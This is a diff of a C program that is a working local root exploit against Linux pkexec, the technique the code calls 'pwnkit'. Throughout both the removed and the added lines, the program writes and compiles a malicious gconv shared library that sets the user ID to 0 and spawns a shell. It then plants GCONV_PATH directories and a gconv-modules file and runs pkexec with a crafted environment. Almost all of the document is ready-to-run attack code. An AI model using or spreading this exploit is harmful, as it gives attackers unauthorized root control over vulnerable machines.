@@ -6,24 +6,11 @@
 #include <sys/types.h>
 #include <fcntl.h>
 
-void fatal(char *f) {
-    perror(f);
-    exit(-1);
-}
-
-void compile_so() {
-    FILE *f = fopen("payload.c", "wb");
-    if (f == NULL) {
-        fatal("fopen");
-    }
-
-    char so_code[]=
-        "#include <stdio.h>\n"
+char *shell = 
+	 "#include <stdio.h>\n"
         "#include <stdlib.h>\n"
         "#include <unistd.h>\n"
-        "void gconv() {\n"
-        "  return;\n"
-        "}\n"
+        "void gconv() {}\n"
         "void gconv_init() {\n"
         "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
         "  static char *a_argv[] = { \"sh\", NULL };\n"
@@ -32,46 +19,56 @@ void compile_so() {
         "  exit(0);\n"
         "}\n";
 
-    fwrite(so_code, strlen(so_code), 1, f);
-    fclose(f);
-
-    system("gcc -o payload.so -shared -fPIC payload.c");
-}
-
 int main(int argc, char *argv[]) {
-    struct stat st;
-    char *a_argv[]={ NULL };
-    char *a_envp[]={
-        "unfichier",
-        "PATH=GCONV_PATH=.",
-        "SHELL=this/path/not/existc",
-        NULL
-    };
+	FILE *fp;
+    	struct stat st;
 
-    compile_so();
+	char *a_argv[]={ NULL };
+    	char *a_envp[]={
+        	"pwnkit", 
+	    "PATH=GCONV_PATH=.", 
+	    "CHARSET=PWNKIT", 
+	    "SHELL=pwnkit", 
+	    NULL
+    	};
 
-    if (stat("GCONV_PATH=.", &st) < 0) {
-        if(mkdir("GCONV_PATH=.", 0777) < 0) {
-            fatal("mkdir");
+	if (stat("GCONV_PATH=.", &st) < 0) {
+            if(mkdir("GCONV_PATH=.", 0777) < 0) {
+                perror("mkdir");
+		exit(0);
+            }
+        int fd = open("GCONV_PATH=./pwnkit", O_CREAT|O_RDWR, 0777);
+            if (fd < 0) {
+                perror("open");
+		exit(0);
+            }
+            close(fd);
+    	}
+	
+	if (stat("pwnkit", &st) < 0) {
+            if(mkdir("pwnkit", 0777) < 0) {
+                perror("mkdir");
+		exit(0);
         }
-        int fd = open("GCONV_PATH=./unfichier", O_CREAT|O_RDWR, 0777);
-        if (fd < 0) {
-            fatal("open");
-        }
-        close(fd);
-    }
 
-    if (stat("unfichier", &st) < 0) {
-        if(mkdir("unfichier", 0777) < 0) {
-            fatal("mkdir");
-        }
-        FILE *fp = fopen("unfichier/gconv-modules", "wb");
+        FILE *fp = fopen("pwnkit/gconv-modules", "wb");
         if(fp == NULL) {
-            fatal("fopen");
+            perror("fopen");
+	    exit(0);
         }
-        fprintf(fp, "module  UTF-8//    INTERNAL    ../payload    2\n");
+        fprintf(fp, "module UTF-8// PWNKIT// pwnkit 2\n");
         fclose(fp);
-    }
+    	}
 
-    execve("/usr/bin/pkexec", a_argv, a_envp);
+	fp = fopen("pwnkit/pwnkit.c", "w");
+	if (fp < 0) {
+                perror("fopen");
+		exit(0);
+        }
+	fprintf(fp, "%s", shell);
+	fclose(fp);
+
+	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+	execve("/usr/bin/pkexec", a_argv, a_envp);
 }
